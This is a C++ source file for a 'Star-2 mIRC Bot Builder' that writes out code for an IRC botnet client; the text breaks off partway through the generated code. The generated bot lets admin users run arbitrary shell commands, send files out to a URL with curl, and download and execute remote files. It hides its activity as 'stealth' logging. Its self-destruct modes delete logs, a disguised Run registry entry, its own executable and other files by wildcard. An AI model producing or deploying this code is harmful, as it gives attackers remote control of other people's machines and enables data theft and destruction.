#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <thread>
#include <chrono>
#include <vector>
#include <algorithm>
#include <signal.h>

class MircBotBuilder {
private:
    std::string botName;
    std::string server;
    int port;
    std::string channel;
    std::string password;
    std::string realName;
    std::string userInfo;
    std::vector<std::string> autoJoinChannels;
    std::vector<std::string> adminUsers;
    bool autoReconnect;
    int reconnectDelay;
    std::string logFile;
    
public:
    MircBotBuilder() {
        // Default settings
        botName = "StarBot";
        server = "irc.rizon.net";
        port = 6667;
        channel = "#rawr";
        password = "";
        realName = "Star-2 IRC Bot";
        userInfo = "Star-2";
        autoReconnect = true;
        reconnectDelay = 30;
        logFile = "bot.log";
        
        // Add default admin
        adminUsers.push_back("ItsMehRawrXD");
    }
    
    void showMenu() {
        std::cout << "\n=== Star-2 mIRC Bot Builder ===\n";
        std::cout << "1. Set Bot Name\n";
        std::cout << "2. Set IRC Server\n";
        std::cout << "3. Set Channel\n";
        std::cout << "4. Set Password\n";
        std::cout << "5. Set Real Name\n";
        std::cout << "6. Add Auto-Join Channels\n";
        std::cout << "7. Add Admin Users\n";
        std::cout << "8. Set Auto-Reconnect Settings\n";
        std::cout << "9. Set Log File\n";
        std::cout << "10. Show Current Settings\n";
        std::cout << "11. Generate Bot\n";
        std::cout << "12. Exit\n";
        std::cout << "Choose option: ";
    }
    
    void setBotName() {
        std::cout << "Current bot name: " << botName << "\n";
        std::cout << "Enter new bot name: ";
        std::getline(std::cin, botName);
        if (botName.empty()) botName = "StarBot";
    }
    
    void setServer() {
        std::cout << "Current server: " << server << "\n";
        std::cout << "Enter IRC server (e.g., irc.freenode.net): ";
        std::getline(std::cin, server);
        if (server.empty()) server = "irc.freenode.net";
        
        std::cout << "Current port: " << port << "\n";
        std::cout << "Enter port (default 6667): ";
        std::string portStr;
        std::getline(std::cin, portStr);
        if (!portStr.empty()) {
            port = std::stoi(portStr);
        }
    }
    
    void setChannel() {
        std::cout << "Current channel: " << channel << "\n";
        std::cout << "Enter channel (e.g., #test): ";
        std::getline(std::cin, channel);
        if (channel.empty()) channel = "#test";
        if (channel[0] != '#') channel = "#" + channel;
    }
    
    void setPassword() {
        std::cout << "Enter server password (leave empty if none): ";
        std::getline(std::cin, password);
    }
    
    void setRealName() {
        std::cout << "Current real name: " << realName << "\n";
        std::cout << "Enter real name: ";
        std::getline(std::cin, realName);
        if (realName.empty()) realName = "Star-2 IRC Bot";
    }
    
    void addAutoJoinChannels() {
        std::cout << "Current auto-join channels:\n";
        for (const auto& ch : autoJoinChannels) {
            std::cout << "  " << ch << "\n";
        }
        std::cout << "Enter channel to add (or 'clear' to clear all): ";
        std::string newChannel;
        std::getline(std::cin, newChannel);
        
        if (newChannel == "clear") {
            autoJoinChannels.clear();
        } else if (!newChannel.empty()) {
            if (newChannel[0] != '#') newChannel = "#" + newChannel;
            autoJoinChannels.push_back(newChannel);
        }
    }
    
    void addAdminUsers() {
        std::cout << "Current admin users:\n";
        for (const auto& user : adminUsers) {
            std::cout << "  " << user << "\n";
        }
        std::cout << "Enter admin username to add (or 'clear' to clear all): ";
        std::string newUser;
        std::getline(std::cin, newUser);
        
        if (newUser == "clear") {
            adminUsers.clear();
        } else if (!newUser.empty()) {
            adminUsers.push_back(newUser);
        }
    }
    
    void setAutoReconnect() {
        std::cout << "Current auto-reconnect: " << (autoReconnect ? "enabled" : "disabled") << "\n";
        std::cout << "Enable auto-reconnect? (y/n): ";
        std::string choice;
        std::getline(std::cin, choice);
        autoReconnect = (choice == "y" || choice == "Y");
        
        if (autoReconnect) {
            std::cout << "Current reconnect delay: " << reconnectDelay << " seconds\n";
            std::cout << "Enter reconnect delay in seconds: ";
            std::string delayStr;
            std::getline(std::cin, delayStr);
            if (!delayStr.empty()) {
                reconnectDelay = std::stoi(delayStr);
            }
        }
    }
    
    void setLogFile() {
        std::cout << "Current log file: " << logFile << "\n";
        std::cout << "Enter log file name: ";
        std::getline(std::cin, logFile);
        if (logFile.empty()) logFile = "bot.log";
    }
    
    void showSettings() {
        std::cout << "\n=== Current Bot Settings ===\n";
        std::cout << "Bot Name: " << botName << "\n";
        std::cout << "Server: " << server << ":" << port << "\n";
        std::cout << "Channel: " << channel << "\n";
        std::cout << "Password: " << (password.empty() ? "none" : "***") << "\n";
        std::cout << "Real Name: " << realName << "\n";
        std::cout << "User Info: " << userInfo << "\n";
        std::cout << "Auto-Join Channels:\n";
        for (const auto& ch : autoJoinChannels) {
            std::cout << "  " << ch << "\n";
        }
        std::cout << "Admin Users:\n";
        for (const auto& user : adminUsers) {
            std::cout << "  " << user << "\n";
        }
        std::cout << "Auto-Reconnect: " << (autoReconnect ? "enabled" : "disabled") << "\n";
        if (autoReconnect) {
            std::cout << "Reconnect Delay: " << reconnectDelay << " seconds\n";
        }
        std::cout << "Log File: " << logFile << "\n";
    }
    
    void generateBot() {
        std::string filename = botName + "_bot.cpp";
        std::ofstream file(filename);
        
        if (!file.is_open()) {
            std::cout << "Error: Could not create bot file!\n";
            return;
        }
        
        file << generateBotCode();
        file.close();
        
        std::cout << "\n✅ Bot generated successfully: " << filename << "\n";
        std::cout << "To compile: g++ -std=c++17 -o " << botName << "_bot " << filename << "\n";
        std::cout << "To run: ./" << botName << "_bot\n";
    }
    
private:
    std::string generateBotCode() {
        std::stringstream code;
        
        code << "#include <iostream>\n";
        code << "#include <string>\n";
        code << "#include <vector>\n";
        code << "#include <thread>\n";
        code << "#include <chrono>\n";
        code << "#include <sys/socket.h>\n";
        code << "#include <netinet/in.h>\n";
        code << "#include <arpa/inet.h>\n";
        code << "#include <unistd.h>\n";
        code << "#include <netdb.h>\n";
        code << "#include <cstring>\n";
        code << "#include <fstream>\n";
        code << "#include <sstream>\n";
        code << "#include <algorithm>\n";
        code << "#include <signal.h>\n";
        code << "#include <random>\n";
        code << "#ifdef _WIN32\n";
        code << "#include <windows.h>\n";
        code << "#endif\n\n";
        
        code << "// Random name generator for auto-rename\n";
        code << "std::string generateRandomBotName() {\n";
        code << "    static std::mt19937 rng(std::time(nullptr));\n";
        code << "    int number = (rng() % 9999) + 1;\n";
        code << "    return \"rawr\" + std::to_string(number);\n";
        code << "}\n\n";
        code << "class MircBot {\n";
        code << "private:\n";
        code << "    std::string botName;\n";
        code << "    std::string server;\n";
        code << "    int port;\n";
        code << "    std::string channel;\n";
        code << "    std::string password;\n";
        code << "    std::string realName;\n";
        code << "    std::string userInfo;\n";
        code << "    std::vector<std::string> autoJoinChannels;\n";
        code << "    std::vector<std::string> adminUsers;\n";
        code << "    bool autoReconnect;\n";
        code << "    int reconnectDelay;\n";
        code << "    std::string logFile;\n";
        code << "    int sockfd;\n";
        code << "    bool running;\n\n";
        
        code << "public:\n";
        code << "    MircBot() : port(6667), autoReconnect(true), reconnectDelay(30), sockfd(-1), running(false) {\n";
        code << "        botName = \"" << botName << "\";\n";
        code << "        server = \"" << server << "\";\n";
        code << "        port = " << port << ";\n";
        code << "        channel = \"" << channel << "\";\n";
        code << "        password = \"" << password << "\";\n";
        code << "        realName = \"" << realName << "\";\n";
        code << "        userInfo = \"" << userInfo << "\";\n";
        code << "        logFile = \"" << logFile << "\";\n";
        code << "        autoReconnect = " << (autoReconnect ? "true" : "false") << ";\n";
        code << "        reconnectDelay = " << reconnectDelay << ";\n\n";
        
        for (const auto& ch : autoJoinChannels) {
            code << "        autoJoinChannels.push_back(\"" << ch << "\");\n";
        }
        
        for (const auto& user : adminUsers) {
            code << "        adminUsers.push_back(\"" << user << "\");\n";
        }
        
        code << "    }\n\n";
        
        code << "    void log(const std::string& message) {\n";
        code << "        // Silent logging - only to file, no console output\n";
        code << "        std::ofstream logStream(logFile, std::ios::app);\n";
        code << "        if (logStream.is_open()) {\n";
        code << "            auto now = std::chrono::system_clock::now();\n";
        code << "            auto time_t = std::chrono::system_clock::to_time_t(now);\n";
        code << "            logStream << std::ctime(&time_t) << \": \" << message << std::endl;\n";
        code << "            logStream.close();\n";
        code << "        }\n";
        code << "        // No console output for stealth mode\n";
        code << "    }\n\n";
        
        code << "    bool connect() {\n";
        code << "        struct sockaddr_in server_addr;\n";
        code << "        struct hostent *host;\n\n";
        code << "        sockfd = socket(AF_INET, SOCK_STREAM, 0);\n";
        code << "        if (sockfd < 0) {\n";
        code << "            log(\"Error creating socket\");\n";
        code << "            return false;\n";
        code << "        }\n\n";
        code << "        host = gethostbyname(server.c_str());\n";
        code << "        if (host == NULL) {\n";
        code << "            log(\"Error resolving hostname: \" + server);\n";
        code << "            return false;\n";
        code << "        }\n\n";
        code << "        memset(&server_addr, 0, sizeof(server_addr));\n";
        code << "        server_addr.sin_family = AF_INET;\n";
        code << "        server_addr.sin_port = htons(port);\n";
        code << "        memcpy(&server_addr.sin_addr.s_addr, host->h_addr, host->h_length);\n\n";
        code << "        if (::connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {\n";
        code << "            log(\"Error connecting to server\");\n";
        code << "            return false;\n";
        code << "        }\n\n";
        code << "        log(\"Connected to \" + server + \":\" + std::to_string(port));\n";
        code << "        return true;\n";
        code << "    }\n\n";
        
        code << "    void sendCommand(const std::string& command) {\n";
        code << "        std::string fullCommand = command + \"\\r\\n\";\n";
        code << "        send(sockfd, fullCommand.c_str(), fullCommand.length(), 0);\n";
        code << "        log(\"SENT: \" + command);\n";
        code << "    }\n\n";
        
        code << "    void authenticate() {\n";
        code << "        if (!password.empty()) {\n";
        code << "            sendCommand(\"PASS \" + password);\n";
        code << "        }\n";
        code << "        sendCommand(\"NICK \" + botName);\n";
        code << "        sendCommand(\"USER \" + userInfo + \" 0 * :\" + realName);\n";
        code << "    }\n\n";
        
        code << "    void joinChannels() {\n";
        code << "        sendCommand(\"JOIN \" + channel);\n";
        code << "        for (const auto& ch : autoJoinChannels) {\n";
        code << "            if (ch != channel) {\n";
        code << "                sendCommand(\"JOIN \" + ch);\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        code << "    bool isAdmin(const std::string& username) {\n";
        code << "        return std::find(adminUsers.begin(), adminUsers.end(), username) != adminUsers.end();\n";
        code << "    }\n\n";
        
        code << "    void handleMessage(const std::string& line) {\n";
        code << "        if (line.find(\"PING :\") == 0) {\n";
        code << "            std::string response = line.substr(6);\n";
        code << "            sendCommand(\"PONG :\" + response);\n";
        code << "            log(\"Responded to PING\");\n";
        code << "        }\n";
        code << "        else if (line.find(\"433\") != std::string::npos) {\n";
        code << "            // Nickname already taken, generate new random name\n";
        code << "            std::string newName = generateRandomBotName();\n";
        code << "            log(\"Nickname taken, trying: \" + newName);\n";
        code << "            sendCommand(\"NICK \" + newName);\n";
        code << "        }\n";
        code << "        else if (line.find(\"PRIVMSG\") != std::string::npos) {\n";
        code << "            size_t pos1 = line.find('!');\n";
        code << "            size_t pos2 = line.find(\" PRIVMSG \");\n";
        code << "            size_t pos3 = line.find(\" :\");\n";
        code << "            if (pos1 != std::string::npos && pos2 != std::string::npos && pos3 != std::string::npos) {\n";
        code << "                std::string sender = line.substr(1, pos1 - 1);\n";
        code << "                std::string target = line.substr(pos2 + 9, line.find(' ', pos2 + 9) - pos2 - 9);\n";
        code << "                std::string message = line.substr(pos3 + 2);\n";
        code << "                log(\"MSG from \" + sender + \" in \" + target + \": \" + message);\n";
        code << "                if (message[0] == '!') {\n";
        code << "                    handleCommand(sender, target, message);\n";
        code << "                }\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        code << "    void handleCommand(const std::string& sender, const std::string& target, const std::string& message) {\n";
        code << "        std::istringstream iss(message);\n";
        code << "        std::string command;\n";
        code << "        iss >> command;\n\n";
        code << "        if (command == \"!help\") {\n";
        code << "            std::string help = \"Available commands: !help, !time, !version, !status\";\n";
        code << "            if (isAdmin(sender)) {\n";
        code << "                help += \", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute, !botkill, !botkiller\";\n";
        code << "            }\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :\" + help);\n";
        code << "        }\n";
        code << "        else if (command == \"!time\") {\n";
        code << "            auto now = std::chrono::system_clock::now();\n";
        code << "            auto time_t = std::chrono::system_clock::to_time_t(now);\n";
        code << "            std::string timeStr = std::ctime(&time_t);\n";
        code << "            timeStr.pop_back();\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Current time: \" + timeStr);\n";
        code << "        }\n";
        code << "        else if (command == \"!version\") {\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Star-2 mIRC Bot v1.0\");\n";
        code << "        }\n";
        code << "        else if (command == \"!status\") {\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Bot is online and running\");\n";
        code << "        }\n";
        code << "        else if (isAdmin(sender)) {\n";
        code << "            if (command == \"!join\") {\n";
        code << "                std::string newChannel;\n";
        code << "                iss >> newChannel;\n";
        code << "                if (!newChannel.empty()) {\n";
        code << "                    if (newChannel[0] != '#') newChannel = \"#\" + newChannel;\n";
        code << "                    sendCommand(\"JOIN \" + newChannel);\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!part\") {\n";
        code << "                std::string partChannel;\n";
        code << "                iss >> partChannel;\n";
        code << "                if (!partChannel.empty()) {\n";
        code << "                    if (partChannel[0] != '#') partChannel = \"#\" + partChannel;\n";
        code << "                    sendCommand(\"PART \" + partChannel);\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!say\") {\n";
        code << "                std::string sayChannel, sayMessage;\n";
        code << "                iss >> sayChannel;\n";
        code << "                std::getline(iss, sayMessage);\n";
        code << "                if (!sayChannel.empty() && !sayMessage.empty()) {\n";
        code << "                    if (sayChannel[0] != '#') sayChannel = \"#\" + sayChannel;\n";
        code << "                    sendCommand(\"PRIVMSG \" + sayChannel + \" :\" + sayMessage);\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!quit\") {\n";
        code << "                sendCommand(\"QUIT :Shutting down\");\n";
        code << "                running = false;\n";
        code << "            }\n";
        code << "            else if (command == \"!upload\") {\n";
        code << "                std::string filename, content;\n";
        code << "                iss >> filename;\n";
        code << "                std::getline(iss, content);\n";
        code << "                if (!filename.empty() && !content.empty()) {\n";
        code << "                    // Remove leading space from content\n";
        code << "                    if (content[0] == ' ') content = content.substr(1);\n";
        code << "                    std::ofstream file(filename);\n";
        code << "                    if (file.is_open()) {\n";
        code << "                        file << content;\n";
        code << "                        file.close();\n";
        code << "                        log(\"File uploaded: \" + filename);\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :File uploaded successfully: \" + filename);\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :Failed to upload file: \" + filename);\n";
        code << "                    }\n";
        code << "                } else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !upload <filename> <content>\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!download\") {\n";
        code << "                std::string filename;\n";
        code << "                iss >> filename;\n";
        code << "                if (!filename.empty()) {\n";
        code << "                    std::ifstream file(filename);\n";
        code << "                    if (file.is_open()) {\n";
        code << "                        std::string content((std::istreambuf_iterator<char>(file)),\n";
        code << "                                             std::istreambuf_iterator<char>());\n";
        code << "                        file.close();\n";
        code << "                        log(\"File downloaded: \" + filename);\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :File content of \" + filename + \": \" + content);\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :File not found: \" + filename);\n";
        code << "                    }\n";
        code << "                } else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !download <filename>\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!execute\") {\n";
        code << "                std::string command_to_execute;\n";
        code << "                std::getline(iss, command_to_execute);\n";
        code << "                if (!command_to_execute.empty()) {\n";
        code << "                    // Remove leading space\n";
        code << "                    if (command_to_execute[0] == ' ') command_to_execute = command_to_execute.substr(1);\n";
        code << "                    log(\"Executing command: \" + command_to_execute);\n";
        code << "                    \n";
        code << "                    // Execute command and capture output\n";
        code << "                    FILE* pipe = popen(command_to_execute.c_str(), \"r\");\n";
        code << "                    if (pipe) {\n";
        code << "                        char buffer[128];\n";
        code << "                        std::string result = \"\";\n";
        code << "                        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {\n";
        code << "                            result += buffer;\n";
        code << "                        }\n";
        code << "                        pclose(pipe);\n";
        code << "                        \n";
        code << "                        if (result.empty()) {\n";
        code << "                            result = \"Command executed successfully (no output)\";\n";
        code << "                        }\n";
        code << "                        \n";
        code << "                        // Send result in chunks if too long\n";
        code << "                        if (result.length() > 400) {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Command output (truncated): \" + result.substr(0, 400) + \"...\");\n";
        code << "                        } else {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Command output: \" + result);\n";
        code << "                        }\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :Failed to execute command\");\n";
        code << "                    }\n";
        code << "                } else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !execute <command>\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!uploadurl\") {\n";
        code << "                std::string url, filename;\n";
        code << "                iss >> url;\n";
        code << "                iss >> filename;\n";
        code << "                if (!url.empty() && !filename.empty()) {\n";
        code << "                    log(\"Downloading from URL: \" + url + \" to \" + filename);\n";
        code << "                    \n";
        code << "                    // Use curl to download file\n";
        code << "                    std::string curlCmd = \"curl -s -L -o \" + filename + \" \\\"\" + url + \"\\\"\";\n";
        code << "                    int result = system(curlCmd.c_str());\n";
        code << "                    \n";
        code << "                    if (result == 0) {\n";
        code << "                        // Check if file was downloaded successfully\n";
        code << "                        std::ifstream checkFile(filename);\n";
        code << "                        if (checkFile.good()) {\n";
        code << "                            checkFile.close();\n";
        code << "                            log(\"File downloaded from URL successfully: \" + filename);\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :File downloaded from URL successfully: \" + filename);\n";
        code << "                        } else {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Failed to download file from URL: \" + url);\n";
        code << "                        }\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :Failed to download from URL: \" + url);\n";
        code << "                    }\n";
        code << "                } else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !uploadurl <url> <filename>\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!downloadurl\") {\n";
        code << "                std::string filename, url;\n";
        code << "                iss >> filename;\n";
        code << "                iss >> url;\n";
        code << "                if (!filename.empty() && !url.empty()) {\n";
        code << "                    // Check if file exists\n";
        code << "                    std::ifstream file(filename);\n";
        code << "                    if (file.is_open()) {\n";
        code << "                        file.close();\n";
        code << "                        log(\"Uploading file to URL: \" + filename + \" -> \" + url);\n";
        code << "                        \n";
        code << "                        // Use curl to upload file\n";
        code << "                        std::string curlCmd = \"curl -s -F \\\"file=@\" + filename + \"\\\" \\\"\" + url + \"\\\"\";\n";
        code << "                        int result = system(curlCmd.c_str());\n";
        code << "                        \n";
        code << "                        if (result == 0) {\n";
        code << "                            log(\"File uploaded to URL successfully: \" + filename + \" -> \" + url);\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :File uploaded to URL successfully: \" + filename + \" -> \" + url);\n";
        code << "                        } else {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Failed to upload file to URL: \" + url);\n";
        code << "                        }\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :File not found: \" + filename);\n";
        code << "                    }\n";
        code << "                } else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !downloadurl <filename> <url>\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!downloadandexecute\") {\n";
        code << "                std::string url, filename;\n";
        code << "                iss >> url;\n";
        code << "                iss >> filename;\n";
        code << "                if (!url.empty() && !filename.empty()) {\n";
        code << "                    log(\"Downloading and executing from URL: \" + url + \" as \" + filename);\n";
        code << "                    \n";
        code << "                    // Use curl to download file\n";
        code << "                    std::string curlCmd = \"curl -s -L -o \" + filename + \" \\\"\" + url + \"\\\"\";\n";
        code << "                    int downloadResult = system(curlCmd.c_str());\n";
        code << "                    \n";
        code << "                    if (downloadResult == 0) {\n";
        code << "                        // Check if file was downloaded successfully\n";
        code << "                        std::ifstream checkFile(filename);\n";
        code << "                        if (checkFile.good()) {\n";
        code << "                            checkFile.close();\n";
        code << "                            log(\"File downloaded successfully, now executing: \" + filename);\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :File downloaded successfully, executing: \" + filename);\n";
        code << "                            \n";
        code << "                            // Make file executable (for Unix-like systems)\n";
        code << "                            std::string chmodCmd = \"chmod +x \" + filename;\n";
        code << "                            system(chmodCmd.c_str());\n";
        code << "                            \n";
        code << "                            // Execute the downloaded file\n";
        code << "                            std::string execCmd = \"./\" + filename;\n";
        code << "                            FILE* pipe = popen(execCmd.c_str(), \"r\");\n";
        code << "                            if (pipe) {\n";
        code << "                                char buffer[128];\n";
        code << "                                std::string result = \"\";\n";
        code << "                                while (fgets(buffer, sizeof(buffer), pipe) != NULL) {\n";
        code << "                                    result += buffer;\n";
        code << "                                }\n";
        code << "                                pclose(pipe);\n";
        code << "                                \n";
        code << "                                if (result.empty()) {\n";
        code << "                                    result = \"File executed successfully (no output)\";\n";
        code << "                                }\n";
        code << "                                \n";
        code << "                                // Send result in chunks if too long\n";
        code << "                                if (result.length() > 400) {\n";
        code << "                                    sendCommand(\"PRIVMSG \" + target + \" :Execution output (truncated): \" + result.substr(0, 400) + \"...\");\n";
        code << "                                } else {\n";
        code << "                                    sendCommand(\"PRIVMSG \" + target + \" :Execution output: \" + result);\n";
        code << "                                }\n";
        code << "                                \n";
        code << "                                log(\"File executed successfully: \" + filename);\n";
        code << "                            } else {\n";
        code << "                                sendCommand(\"PRIVMSG \" + target + \" :Failed to execute downloaded file: \" + filename);\n";
        code << "                                log(\"Failed to execute file: \" + filename);\n";
        code << "                            }\n";
        code << "                        } else {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Failed to download file from URL: \" + url);\n";
        code << "                            log(\"Download failed: \" + url);\n";
        code << "                        }\n";
        code << "                    } else {\n";
        code << "                        sendCommand(\"PRIVMSG \" + target + \" :Failed to download from URL: \" + url);\n";
        code << "                        log(\"Download failed: \" + url);\n";
        code << "                    }\n";
        code << "                } else {\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !downloadandexecute <url> <filename>\");\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!botkill\") {\n";
        code << "                std::string killType;\n";
        code << "                iss >> killType;\n";
        code << "                \n";
        code << "                log(\"Botkill command received: \" + killType);\n";
        code << "                sendCommand(\"PRIVMSG \" + target + \" :Botkill initiated: \" + killType);\n";
        code << "                \n";
        code << "                if (killType == \"clean\") {\n";
        code << "                    // Clean kill - just exit gracefully\n";
        code << "                    log(\"Clean botkill - exiting gracefully\");\n";
        code << "                    sendCommand(\"QUIT :Clean shutdown\");\n";
        code << "                    running = false;\n";
        code << "                }\n";
        code << "                else if (killType == \"stealth\") {\n";
        code << "                    // Stealth kill - remove traces and exit\n";
        code << "                    log(\"Stealth botkill - removing traces\");\n";
        code << "                    \n";
        code << "                    // Remove log file\n";
        code << "                    std::string removeLogCmd = \"rm -f \" + logFile;\n";
        code << "                    system(removeLogCmd.c_str());\n";
        code << "                    \n";
        code << "                    // Remove startup registry entry (Windows)\n";
        code << "                    #ifdef _WIN32\n";
        code << "                    std::string removeRegCmd = \"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f\";\n";
        code << "                    system(removeRegCmd.c_str());\n";
        code << "                    #endif\n";
        code << "                    \n";
        code << "                    // Remove executable file\n";
        code << "                    char exePath[1024];\n";
        code << "                    #ifdef _WIN32\n";
        code << "                    GetModuleFileNameA(NULL, exePath, sizeof(exePath));\n";
        code << "                    #else\n";
        code << "                    readlink(\"/proc/self/exe\", exePath, sizeof(exePath));\n";
        code << "                    #endif\n";
        code << "                    \n";
        code << "                    std::string removeExeCmd = \"rm -f \\\"\" + std::string(exePath) + \"\\\"\";\n";
        code << "                    system(removeExeCmd.c_str());\n";
        code << "                    \n";
        code << "                    sendCommand(\"QUIT :Stealth shutdown\");\n";
        code << "                    running = false;\n";
        code << "                }\n";
        code << "                else if (killType == \"nuclear\") {\n";
        code << "                    // Nuclear kill - remove everything and crash\n";
        code << "                    log(\"Nuclear botkill - removing everything\");\n";
        code << "                    \n";
        code << "                    // Remove all downloaded files\n";
        code << "                    system(\"rm -f *.txt *.sh *.exe *.bin *.cpp\");\n";
        code << "                    \n";
        code << "                    // Remove log file\n";
        code << "                    std::string removeLogCmd = \"rm -f \" + logFile;\n";
        code << "                    system(removeLogCmd.c_str());\n";
        code << "                    \n";
        code << "                    // Remove startup registry entry (Windows)\n";
        code << "                    #ifdef _WIN32\n";
        code << "                    std::string removeRegCmd = \"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f\";\n";
        code << "                    system(removeRegCmd.c_str());\n";
        code << "                    #endif\n";
        code << "                    \n";
        code << "                    // Remove executable file\n";
        code << "                    char exePath[1024];\n";
        code << "                    #ifdef _WIN32\n";
        code << "                    GetModuleFileNameA(NULL, exePath, sizeof(exePath));\n";
        code << "                    #else\n";
        code << "                    readlink(\"/proc/self/exe\", exePath, sizeof(exePath));\n";
        code << "                    #endif\n";
        code << "                    \n";
        code << "                    std::string removeExeCmd = \"rm -f \\\"\" + std::string(exePath) + \"\\\"\";\n";
        code << "                    system(removeExeCmd.c_str());\n";
        code << "                    \n";
        code << "                    sendCommand(\"QUIT :Nuclear shutdown\");\n";
        code << "                    running = false;\n";
        code << "                }\n";
        code << "                else {\n";
        code << "                    // Default kill - just exit\n";
        code << "                    log(\"Default botkill - exiting\");\n";
        code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !botkill [clean|stealth|nuclear]\");\n";
        code << "                    sendCommand(\"QUIT :Botkill shutdown\");\n";
        code << "                    running = false;\n";
        code << "                }\n";
        code << "            }\n";
        code << "            else if (command == \"!botkiller\") {\n";
        code << "                std::string action;\n";
        code << "                iss >> action;\n";
        code << "                \n";
        code << "                log(\"Botkiller command received: \" + action);\n";
        code << "                sendCommand(\"PRIVMSG \" + target + \" :Botkiller initiated: \" + action);\n";
        code << "                \n";
        code << "                if (action == \"scan\") {\n";
        code << "                    // Scan for common malware indicators\n";
        code << "                    log(\"Botkiller scan - searching for malware\");\n";
        code << "                    \n";
        code << "                    std::string scanResults = \"\";\n";
        code << "                    \n";
        code << "                    // Check for suspicious processes\n";
        code << "                    FILE* psPipe = popen(\"ps aux | grep -E '(bot|malware|backdoor|trojan|virus|keylogger|spyware)' | grep -v grep\", \"r\");\n";
        code << "                    if (psPipe) {\n";
        code << "                        char buffer[256];\n";
        code << "                        std::string suspiciousProcesses = \"\";\n";
        code << "                        while (fgets(buffer, sizeof(buffer), psPipe) != NULL) {\n";
        code << "                            suspiciousProcesses += buffer;\n";
        code << "                        }\n";
        code << "                        pclose(psPipe);\n";
        code << "                        \n";
        code << "                        if (!suspiciousProcesses.empty()) {\n";
        code << "                            scanResults += \"Suspicious processes found:\\n\" + suspiciousProcesses;\n";
        code << "                        } else {\n";
        code << "                            scanResults += \"No suspicious processes detected.\\n\";\n";
        code << "                        }\n";
        code << "                    }\n";
        code << "                    \n";
        code << "                    // Check for suspicious files\n";
        code << "                    FILE* findPipe = popen(\"find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' 2>/dev/null\", \"r\");\n";
        code << "                    if (findPipe) {\n";
        code << "                        char buffer[256];\n";
        code << "                        std::string suspiciousFiles = \"\";\n";
        code << "                        while (fgets(buffer, sizeof(buffer), findPipe) != NULL) {\n";
        code << "                            suspiciousFiles += buffer;\n";
        code << "                        }\n";
        code << "                        pclose(findPipe);\n";
        code << "                        \n";
        code << "                        if (!suspiciousFiles.empty()) {\n";
        code << "                            scanResults += \"\\nSuspicious files found:\\n\" + suspiciousFiles;\n";
        code << "                        } else {\n";
        code << "                            scanResults += \"\\nNo suspicious files detected.\\n\";\n";
        code << "                        }\n";
        code << "                    }\n";
        code << "                    \n";
        code << "                    // Check for suspicious network connections\n";
        code << "                    FILE* netPipe = popen(\"netstat -tuln | grep -E ':(6667|8080|4444|31337|1337)'\", \"r\");\n";
        code << "                    if (netPipe) {\n";
        code << "                        char buffer[256];\n";
        code << "                        std::string suspiciousConnections = \"\";\n";
        code << "                        while (fgets(buffer, sizeof(buffer), netPipe) != NULL) {\n";
        code << "                            suspiciousConnections += buffer;\n";
        code << "                        }\n";
        code << "                        pclose(netPipe);\n";
        code << "                        \n";
        code << "                        if (!suspiciousConnections.empty()) {\n";
        code << "                            scanResults += \"\\nSuspicious network connections:\\n\" + suspiciousConnections;\n";
        code << "                        } else {\n";
        code << "                            scanResults += \"\\nNo suspicious network connections.\\n\";\n";
        code << "                        }\n";
        code << "                    }\n";
        code << "                    \n";
        code << "                    // Send scan results\n";
        code << "                    if (scanResults.length() > 400) {\n";
